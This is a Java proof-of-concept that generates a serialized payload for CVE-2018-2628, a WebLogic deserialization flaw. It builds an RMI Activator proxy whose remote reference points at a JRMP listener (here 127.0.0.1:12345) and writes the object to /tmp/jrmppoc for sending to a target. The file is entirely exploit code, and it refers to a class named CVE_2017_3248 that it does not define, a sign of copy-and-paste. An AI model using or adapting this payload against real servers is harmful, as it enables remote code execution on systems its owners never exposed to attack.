import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Proxy;
import java.rmi.activation.Activator;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

public class CVE_2018_2628 {
    public static void main(String[] args) throws Exception{
        ObjID objID = new ObjID((new Random()).nextInt());
        TCPEndpoint endpoint = new TCPEndpoint("127.0.0.1", 12345);
        UnicastRef unicastRef = new UnicastRef(new LiveRef(objID, endpoint, false));
        RemoteObjectInvocationHandler objectInvocationHandler = new RemoteObjectInvocationHandler(unicastRef);
        Object object = Proxy.newProxyInstance(CVE_2017_3248.class.getClassLoader(), new Class[]{Activator.class}, objectInvocationHandler);


        FileOutputStream fileOutputStream = new FileOutputStream("/tmp/jrmppoc");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(object);
    }
}
